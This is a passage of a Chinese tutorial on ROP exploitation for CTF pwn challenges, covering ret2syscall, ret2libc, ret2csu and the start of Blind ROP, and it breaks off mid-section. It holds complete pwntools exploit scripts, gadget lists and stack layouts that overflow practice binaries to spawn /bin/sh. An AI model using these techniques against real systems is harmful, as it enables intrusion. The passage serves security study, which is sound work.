eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。\n\n5.首先，我们来寻找控制eax的gadgets\n\n```assembly\n➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x080bb196 : pop eax ; ret\n0x0807217a : pop eax ; ret 0x80e\n0x0804f704 : pop eax ; ret 3\n0x0809ddd9 : pop es  ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n```\n\n6.可以看到有上述几个都可以控制eax，那我就选取第二个来作为我的gadgets。\n\n类似的，我们可以得到控制其它寄存器的gadgets\n\n```assembly\nret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'\n0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret\n0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret\n0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret\n0x080be23f : pop ebx ; pop edi ; ret\n0x0806eb69 : pop ebx ; pop edx ; ret\n0x08092258 : pop ebx ; pop esi ; pop ebp ; ret\n0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10\n0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14\n0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc\n0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4\n0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8\n0x08048913 : pop ebx ; pop esi ; pop edi ; ret\n0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4\n0x08049a94 : pop ebx ; pop esi ; ret\n0x080481c9 : pop ebx ; ret\n0x080d7d3c : pop ebx ; ret 0x6f9\n0x08099c87 : pop ebx ; ret 8\n0x0806eb91 : pop ecx ; pop ebx ; ret\n0x0806336b : pop edi ; pop esi ; pop ebx ; ret\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret\n0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret\n0x0805c820 : pop esi ; pop ebx ; ret\n0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0807b6ed : pop ss ; pop ebx ; ret\n```\n\n这里，我选择\n\n```assembly\n0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret\n```\n\n这个可以直接控制其它三个寄存器。\n\n7.此外，我们需要获得/bin/sh字符串对应的地址。\n\n```assembly\n➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh'\nStrings information\n============================================================\n0x080be408 : /bin/sh\n```\n\n8.可以找到对应的地址，此外，还有int 0x80的地址，如下\n\n```assembly\n➜  ret2syscall ROPgadget --binary rop  --only 'int'                 \nGadgets information\n============================================================\n0x08049421 : int 0x80\n0x080938fe : int 0xbb\n0x080869b5 : int 0xf6\n0x0807b4d4 : int 0xfc\nUnique gadgets found: 4\n```\n\n同时，也找到对应的地址了。\n\n9.下面就是对应的payload,其中0xb为execve对应的系统调用号。\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./rop')\npop_eax_ret = 0x080bb196\npop_edx_ecx_ebx_ret = 0x0806eb90\nint_0x80 = 0x08049421\nbinsh = 0x80be408\npayload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])\nsh.sendline(payload)\nsh.interactive()\n```\n\n**栈布局**\n\npayload栈中部署：\n\n```assembly\n                       +---------------------------+\n                       |         int_0x80          | int_0x80指令部署(等待被执行)\n                       +---------------------------+\n                       |          bin_sh           | execve第一个参数部署(等待pop到edx中)\n                       +---------------------------+\n                       |            0              | execve第二个参数部署(等待pop到ecx中)\n                       +---------------------------+\n                       |            0              | execve第三个参数部署(等待pop到ebx中)\n                       +---------------------------+\n                       |pop_edx_pop_ecx_pop_ebx_ret| 执行pop ebx、ecx、edx ret地址\n                       +---------------------------+\n                       |           0xb             | 系统调用号部署（等待pop到eax寄存器中） \n                       +---------------------------+\n                       |       pop_eax_ret         | 执行pop eax ret地址，覆盖原ret返回位置\n                       +---------------------------+\n                       |           kdig            | 'hollkdig'覆盖原saved ebp位置\n                ebp--->+---------------------------+\n                       |           holl            | 'hollkdig'占位填满栈空间\n                       |           ....            | 'hollkdig'占位填满栈空间\n                       |           kdig            | 'hollkdig'占位填满栈空间\n                       |           holl            | 'hollkdig'占位填满栈空间\n                       |           kdig            | 'hollkdig'占位填满栈空间\n                       |           holl            | 'hollkdig'占位填满栈空间\n  v4终止位置,ebp-0x64-->+---------------------------+\n```\n\n执行流程：\n\n```assembly\neip ---> pop_eax_ret gadget地址\t\t\t\t   (由于pop_eax_ret覆盖了原ret地址，所以eip指向gadget并执行)\nesp ---> 0xb\t\t\t\t\t\t\t\t    (此时esp指向部署到栈中的0xb)\neax = 0xb\t\t\t\t\t\t\t\t\t\t(pop eax后将0xb压入eax寄存器)\neip ---> pop_edx_pop_ecx_pop_ebx_ret gadget地址  \n\t\t\t\t\t\t\t\t\t\t     (由于pop eax结束后进行ret操作，所以eip继续指向第二个gadget并执行)\nesp ---> 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)\nebx = 0\t\t\t\t\t\t\t\t\t\t (pop ebx后将0压入ebx寄存器)\nesp ---> 0\t\t\t\t\t\t\t\t\t (此时esp指向部署到栈中的execve第三个参数0)\necx = 0\t\t\t\t\t\t\t\t\t\t (pop ecx后将0压入ecx寄存器)\nesp ---> bin_sh地址\t\t\t \t\t        (此时esp指向部署到栈中的execve第三个参数bin_sh地址)\nedx = bin_sh地址\t\t\t\t\t            (pop edx后将bin_sh地址压入eax寄)\n执行int_0x80                                  (由于执行完pop ebx、ecx、edx后进行ret操作，所以eip指向最后的int)\n```\n\n**基本ROP**-**ret2libc**\n\nret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system(\"/bin/sh\")，故而此时我们需要知道system函数的地址。\n\n**以bamboofox中ret2libc1**\n\n1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。\n\n```c\n➜  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"RET2LIBC >_<\");\n  gets((char *)&v4);\n  return 0;\n}\n```\n\n3.此外，利用ropgadget，我们可以查看是否有/bin/sh存在\n\n```c\n➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          \nStrings information\n============================================================\n0x08048720 : /bin/sh\n```\n\n确实存在，再次查找一下是否有system函数存在。经在ida中查找，确实也存在。\n\n```assembly\n.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]\n```\n\n4.那么，我们直接返回该处，即执行system函数。相应的payload如下\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2libc1')\nbinsh_addr = 0x8048720\nsystem_plt = 0x08048460\npayload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])\nsh.sendline(payload)\nsh.interactive()\n```\n\n这里我们需要注意函数调用栈的结构，如果是正常调用system函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb'作为虚假的地址，其后参数对应的参数内容。\n\n这个例子，相对来说，最为简单，同时提供了system地址与/bin/sh的地址，但是大多数程序并不会有这么好的情况。\n\n**以bamboofox中的ret2libc2为例**\n\n1.首先，我们可以检查一下程序的安全保护。源程序为32位，开启了NX保护。\n\n```assembly\n➜  ret2libc1 checksec ret2libc1    \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n2.下面来看一下程序源代码，确定漏洞位置。可以看到在执行gets函数的时候出现了栈溢出。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [sp+1Ch] [bp-64h]@1\nsetvbuf(stdout, 0, 2, 0);\n  setvbuf(_bss_start, 0, 1, 0);\n  puts(\"RET2LIBC >_<\");\n  gets((char *)&v4);\n  return 0;\n}\n```\n\n3.该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(\"/bin/sh\")。\n\n4.首先需要在bss段找一块地址写我们的/bin/sh的字符串，我们可以发现bss段有个buf2的变量，未被使用\n\n```assembly\n.bss:0804A080 buf2            db 64h dup(?)\n.bss:0804A080 _bss            ends\n```\n\n那么构造如下： \n\n```c\ngets(buf2);\nsystem(buf2);\n```\n\n那么先让返回地址为gets函数地址，参数为buf2地址，下一层返回地址需要弹出栈顶的buf2，然后跳到system地址去执行，那么就需要找一个pop|ret的gadget\n\n```assembly\nROPgadget --binary ret2libc2 --only \"pop|ret\"\nGadgets information\n============================================================\n0x0804872f : pop ebp ; ret\n0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n0x0804843d : pop ebx ; ret\n0x0804872e : pop edi ; pop ebp ; ret\n0x0804872d : pop esi ; pop edi ; pop ebp ; ret\n0x08048426 : ret\n0x0804857e : ret 0xeac1\nUnique gadgets found: 7\n```\n\n这里我们选择0x0804843d这个地址\n\n5.利用脚本如下所示：\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nsh = process('./ret2libc2')\ngets_plt = 0x08048460\nsystem_plt = 0x08048490\npop_ebx = 0x0804843d\nbuf2 = 0x804a080\npayload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\nsh.sendline(payload)\nsh.sendline('/bin/sh')\nsh.interactive()\n```\n\n需要注意的是，我这里向程序中bss段的buf2处写入/bin/sh字符串，并将其地址作为system的参数传入。这样以便于可以获得shell。\n\n**以bamboofox中的ret2libc3为例**\n\n在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。\n\n1.首先，查看安全保护。可以看出，源程序仍旧开启了堆栈不可执行保护。\n\n➜ ret2libc3 checksec ret2libc3\n   Arch:   i386-32-little\n   RELRO:  Partial RELRO\n   Stack:  No canary found\n   NX:    NX enabled\n   PIE:   No PIE (0x8048000)\n\n2.进而查看源码，发现程序的bug仍然是栈溢出。\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n {\n  int v4; // [sp+1Ch] [bp-64h]@1\n  setvbuf(stdout, 0, 2, 0);\n  setvbuf(stdin, 0, 1, 0);\n  puts(\"No surprise anymore, system disappeard QQ.\");\n  printf(\"Can you find it !?\");\n  gets((char *)&v4);\n  return 0;\n }\n```\n\n3.那么我们如何得到system函数的地址呢？这里就主要利用了两个知识点\n\n- system函数属于libc，而libc.so文件中的函数之间相对偏移是固定的。\n- 即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而libc在github上有人进行收集（libc-database），具体细节如下\n\n所以如果我们知道libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system函数的地址。\n\n那么如何得到libc中的某个函数的地址呢？我们一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。**当然，由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露。**\n\n我们自然可以根据上面的步骤先得到libc，之后在程序中查询偏移，然后再次获取system地址，但这样手工操作次数太多，有点麻烦，github上有一个libc的利用工具（LibcSearcher），具体细节请参考readme\n\n此外，在得到libc之后，其实libc中也是有/bin/sh字符串的，所以我们可以一起获得/bin/sh字符串的地址。\n\n4.这里我们泄露__libc_start_main的地址，这是因为它是程序最初被执行的地方。基本利用思路如下\n\n- 泄露__libc_start_main地址\n- 获取libc版本(这里借助的是LibcSearcher)\n- 获取system地址与/bin/sh的地址\n- 再次执行源程序\n- 触发栈溢出执行system(‘/bin/sh’)\n\nexp如下???\n\n```python\n##!/usr/bin/env python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\nsh = process('./ret2libc3')\nret2libc3 = ELF('./ret2libc3')\nputs_plt = ret2libc3.plt['puts']\nlibc_start_main_got = ret2libc3.got['__libc_start_main']\nmain = ret2libc3.symbols['main']\nprint \"leak libc_start_main_got addr and return to main again\"\npayload = flat(['A' * 112, puts_plt, main, libc_start_main_got])\nsh.sendlineafter('Can you find it !?', payload)\nprint \"get the related addr\"\nlibc_start_main_addr = u32(sh.recv()[0:4])\nlibc = LibcSearcher('__libc_start_main', libc_start_main_addr)\nlibcbase = libc_start_main_addr - libc.dump('__libc_start_main')\nsystem_addr = libcbase + libc.dump('system')\nbinsh_addr = libcbase + libc.dump('str_bin_sh')\nprint \"get shell\"\npayload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])\nsh.sendline(payload)\nsh.interactive()\n```\n\n**shell获取小结**\n\n这里总结几种常见的获取shell的方式：\n\n- 执行shellcode，这一方面也会有不同的情况\n\n- - 可以直接返回shell\n  - 可以将shell返回到某一个端口\n  - shellcode中字符有时候需要满足不同的需求\n  - **注意，我们需要将shellcode写在可以执行的内存区域中。**\n\n- 执行     system(\"/bin/sh\"), system('sh') 等等\n\n- - 关于 system的地址，参见下面章节的**地址寻找**。\n\n  - 关于 \"/bin/sh\",“sh”\n\n  - - 首先寻找 binary 里面有没有对应的字符串，**比如说有 flush 函数，那就一定有 sh 了**\n    - 考虑个人读取对应字符串\n    - libc 中其实是有 /bin/sh 的\n\n  - 优点\n\n  - - 只需要一个参数。\n\n  - 缺点\n\n  - - **有可能因为破坏环境变量而无法执行。**\n\n- 执行     execve(\"/bin/sh\",NULL,NULL)\n\n- - 前几条同 system\n\n  - 优点\n\n  - - 几乎不受环境变量的影响。\n\n  - 缺点\n\n  - - **需要 3 个参数。**\n\n- 系统调用\n\n- - 系统调用号 11(0xb)\n\n**地址寻找小结**\n\n在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种\n\n**通用寻找**\n\n**直接地址寻找**\n\n程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。\n\n**got表寻找**\n\n有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（**前提是这个函数已经被解析一次了**）。\n\n**有libc**\n\n**相对偏移寻找**，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。**注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。**常见的有wapper的函数有（待补充）。\t\n\n**无libc**\n\n其实，这种情况的解决策略分为两种\n\n- 想办法获取libc\n- 想办法直接获取对应的地址。\n\n而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。\n\n- puts会有\\x00截断的问题\n- write可以指定长度输出的内容。\n\n下面是一些相应的方法\n\n**DynELF**\n\n前提是我们可以泄露任意地址的内容。\n\n- **如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。**\n\n**libc数据库**\n\n\\## 更新数据库\n ./get\n \\## 将已有libc添加到数据库中\n ./add libc.so\n \\## Find all the libc's in the database that have the given names at the given addresses.\n ./find function1 addr function2 addr\n \\## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.\n ./Dump some useful offsets\n\n去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。\n\n- libcdb.com\n\n**当然，还有上面提到的LibcSearcher。**\n\n**ret2dl-resolve**\n\n当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数（如：system）的解析。这也是我们在高级rop中会介绍的技巧。\n\n### 中级了@@@o(*￣▽￣*)ブ！！！\n\n**ret2__libc_scu_init**\n\n中级ROP主要是使用了一些比较巧妙的Gadgets。\n\n在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数(当然，不同版本的这个函数有一定的区别)\n\n```assembly\n.text:00000000004005C0 ; void _libc_csu_init(void)\n.text:00000000004005C0                 public __libc_csu_init\n.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16\u0018o\n.text:00000000004005C0                 push    r15\n.text:00000000004005C2                 push    r14\n.text:00000000004005C4                 mov     r15d, edi\n.text:00000000004005C7                 push    r13\n.text:00000000004005C9                 push    r12\n.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry\n.text:00000000004005D2                 push    rbp\n.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:00000000004005DA                 push    rbx\n.text:00000000004005DB                 mov     r14, rsi\n.text:00000000004005DE                 mov     r13, rdx\n.text:00000000004005E1                 sub     rbp, r12\n.text:00000000004005E4                 sub     rsp, 8\n.text:00000000004005E8                 sar     rbp, 3\n.text:00000000004005EC                 call    _init_proc\n.text:00000000004005F1                 test    rbp, rbp\n.text:00000000004005F4                 jz      short loc_400616\n.text:00000000004005F6                 xor     ebx, ebx\n.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400600\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n```\n\n这里我们可以利用以下几点\n\n- 从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。\n- 从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，**但其实此时rdi的高32位寄存器值为0（自行调试）**，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。\n- 从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。\n\n蒸米的一步一步学ROP之linux_x64篇中level5为例\n\n1.首先检查程序的安全保护\n\n➜ ret2__libc_csu_init git:(iromise) ✗ checksec level5  \n   Arch:   amd64-64-little\n   RELRO:  Partial RELRO\n   Stack:  No canary found\n   NX:    NX enabled\n   PIE:   No PIE (0x400000)\n\n程序为64位，开启了堆栈不可执行保护。\n\n2.其次，寻找程序的漏洞，可以看出程序中有一个简单的栈溢出\n\n```c\nssize_t vulnerable_function()\n{\n  char buf; // [sp+0h] [bp-80h]@1\n  return read(0, &buf, 0x200uLL);\n}\n```\n\n简单浏览下程序，发现程序中既没有system函数地址，也没有/bin/sh字符串，所以两者都需要我们自己去构造了。\n\n**注：这里我尝试在我本机使用system函数来获取shell失败了，应该是环境变量的问题，所以这里使用的是execve来获取shell。**\n\n3.基本利用思路如下：\n\n- 利用栈溢出执行libc_csu_gadgets获取write函数地址，并使得程序重新执行main函数\n- 根据libcsearcher获取对应libc版本以及execve函数地址\n- 再次利用栈溢出执行libc_csu_gadgets向bss段写入execve地址以及'/bin/sh’地址，并使得程序重新执行main函数。\n- 再次利用栈溢出执行libc_csu_gadgets执行execve('/bin/sh')获取shell。\n\nexp如下\n\n```python\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\n##context.log_level = 'debug'\nlevel5 = ELF('./level5')\nsh = process('./level5')\nwrite_got = level5.got['write']\nread_got = level5.got['read']\nmain_addr = level5.symbols['main']\nbss_base = level5.bss()\ncsu_front_addr = 0x0000000000400600\ncsu_end_addr = 0x000000000040061A\nfakeebp = 'b' * 8\ndef csu(rbx, rbp, r12, r13, r14, r15, last):\n    # pop rbx,rbp,r12,r13,r14,r15\n    # rbx should be 0,\n    # rbp should be 1,enable not to jump\n    # r12 should be the function we want to call\n    # rdi=edi=r15d\n    # rsi=r14\n    # rdx=r13\n    payload = 'a' * 0x80 + fakeebp\n    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(\n        r13) + p64(r14) + p64(r15)\n    payload += p64(csu_front_addr)\n    payload += 'a' * 0x38\n    payload += p64(last)\n    sh.send(payload)\n    sleep(1)\nsh.recvuntil('Hello, World\\n')\n## RDI, RSI, RDX, RCX, R8, R9, more on the stack\n## write(1,write_got,8)\ncsu(0, 1, write_got, 8, write_got, 1, main_addr)\nwrite_addr = u64(sh.recv(8))\nlibc = LibcSearcher('write', write_addr)\nlibc_base = write_addr - libc.dump('write')\nexecve_addr = libc_base + libc.dump('execve')\nlog.success('execve_addr ' + hex(execve_addr))\n##gdb.attach(sh)\n## read(0,bss_base,16)\n## read execve_addr and /bin/sh\\x00\nsh.recvuntil('Hello, World\\n')\ncsu(0, 1, read_got, 16, bss_base, 0, main_addr)\nsh.send(p64(execve_addr) + '/bin/sh\\x00')\nsh.recvuntil('Hello, World\\n')\n## execve(bss_base+8)\ncsu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)\nsh.interactive()\n```\n\n**改进**\n\n在上面的时候，我们直接利用了这个通用gadgets，其输入的字节长度为128。但是，并不是所有的程序漏洞都可以让我们输入这么长的字节。那么当允许我们输入的字节数较少的时候，我们该怎么有什么办法呢？下面给出了几个方法\n\n**改进1-提前控制rbx与rbp**\n\n可以看到在我们之前的利用中，我们利用这两个寄存器的值的主要是为了满足cmp的条件，并进行跳转。如果我们可以提前控制这两个数，那么我们就可以减少16字节，即我们所需的字节数只需要112。\n\n**改进2-多次利用**\n\n其实，改进1也算是一种多次利用。我们可以看到我们的gadgets是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次gadgets所需要的字节数。但这里的多次利用需要更加严格的条件\n\n- 漏洞可以被多次触发\n- 在两次触发之间，程序尚未修改r12-r15寄存器，这是因为要两次调用。\n\n**当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。**\n\n**gadget**\n\n其实，除了上述这个gadgets，gcc默认还会编译进去一些其它的函数\n\n```c\n_init\n_start\ncall_gmon_start\nderegister_tm_clones\nregister_tm_clones\n__do_global_dtors_aux\nframe_dummy\n__libc_csu_init\n__libc_csu_fini\n_fini\n```\n\n我们也可以尝试利用其中的一些代码来进行执行。此外，由于PC本身只是将程序的执行地址处的数据传递给CPU，而CPU则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以我们可以将源程序中一些地址进行偏移从而来获取我们所想要的指令，只要可以确保程序不崩溃。\n\n需要一说的是，在上面的libc_csu_init中我们主要利用了以下寄存器\n\n- 利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。\n- 利用中间部分的代码控制了rdx，rsi，edi。\n\n而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下\n\n```assembly\ngef➤  x/5i 0x000000000040061A\n   0x40061a <__libc_csu_init+90>:   pop    rbx\n   0x40061b <__libc_csu_init+91>:   pop    rbp\n   0x40061c <__libc_csu_init+92>:   pop    r12\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\ngef➤  x/5i 0x000000000040061b\n   0x40061b <__libc_csu_init+91>:   pop    rbp\n   0x40061c <__libc_csu_init+92>:   pop    r12\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\ngef➤  x/5i 0x000000000040061A+3\n   0x40061d <__libc_csu_init+93>:   pop    rsp\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret\ngef➤  x/5i 0x000000000040061e\n   0x40061e <__libc_csu_init+94>:   pop    r13\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\ngef➤  x/5i 0x000000000040061f\n   0x40061f <__libc_csu_init+95>:   pop    rbp\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\ngef➤  x/5i 0x0000000000400620\n   0x400620 <__libc_csu_init+96>:   pop    r14\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\n   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]\ngef➤  x/5i 0x0000000000400621\n   0x400621 <__libc_csu_init+97>:   pop    rsi\n   0x400622 <__libc_csu_init+98>:   pop    r15\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\ngef➤  x/5i 0x000000000040061A+9\n   0x400623 <__libc_csu_init+99>:   pop    rdi\n   0x400624 <__libc_csu_init+100>:  ret    \n   0x400625:    nop\n   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]\n   0x400630 <__libc_csu_fini>:  repz ret\n```\n\n**参考题目**\n\n- 2016 XDCTF pwn100\n- 2016 华山杯 SU_PWN\n\n**BROP**\n\nBROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是**Hacking Blind**\n\nBROP是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流.\n\n1. 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。\n2. 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,     MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。\n\n目前，大部分应用都会开启ASLR、NX、Canary保护。这里我们分别讲解在BROP中如何绕过这些保护，以及如何进行攻击。\n\n**基本思路**\n\n在BROP中，基本的遵循的思路如下\n\n- 判断栈溢出长度\n\n- - 暴力枚举\n\n- Stack Reading\n\n- - 获取栈上的数据来泄露canaries，以及ebp和返回地址。\n\n- Bind ROP\n\n- - 找到足够多的 gadgets      来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及puts函数。\n\n- Build the exploit\n\n- - 利用输出函数来 dump      出程序以便于来找到更多的 gadgets，从而可以写出最后的 exploit\n\n**栈溢出长度**\n\n直接从1暴力枚举即可，直到发现程序崩溃。\n\n**Stack Reading**\n\n如下所示，这是目前经典的栈布局\n\n```assembly\nbuffer|canary|saved fame pointer|saved returned address\n```\n\n要向得到canary以及之后的变量，我们需要解决第一个问题，如何得到overflow的长度，这个可以通过不断尝试来获取。\n\n其次，关于canary以及后面的变量，所采用的的方法一致，这里我们以canary为例。\n\ncanary本身可以通过爆破来获取，但是如果只是愚蠢地枚举所有的数值的话，显然是低效的。\n\n需要注意的是，攻击条件2表明了程序本身并不会因为crash有变化，所以每次的canary等值都是一样的。所以我们可以按照字节进行爆破。正如论文中所展示的，每个字节最多有256种可能，所以在32位的情况下，我们最多需要爆破1024次，64位最多爆破2048次。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629162057713.png\" alt=\"image-20210629162057713\" style=\"zoom:67%;\" />\n\n**Blind ROP**\n\n最朴素的执行write函数的方法就是构造系统调用。\n\npop rdi; ret # socket\n pop rsi; ret # buffer\n pop rdx; ret # length\n pop rax; ret # write syscall number\n syscall\n\n但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。\n\n**BROP 